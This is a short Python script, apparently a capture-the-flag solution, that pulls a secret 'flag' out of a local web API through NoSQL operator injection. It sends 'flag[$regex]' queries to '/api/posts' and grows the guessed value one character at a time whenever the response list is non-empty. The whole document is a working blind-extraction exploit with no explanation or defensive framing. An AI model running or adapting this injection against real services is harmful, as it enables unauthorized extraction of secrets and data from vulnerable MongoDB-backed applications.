import requests
import string
from collections import deque

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "+-{}"

q = deque([""])
while q:
    for _ in range(len(q)):
        prefix = q.popleft()
        for c in charset:
            payload = "^" + prefix + c + ".*$"
            endpoint = f"http://localhost:8080/api/posts?flag[$regex]={payload}"
            response = requests.get(endpoint)
            if len(response.json()) > 0:
                candidate = prefix + c
                print("Found prefix", candidate)
                q.append(candidate)
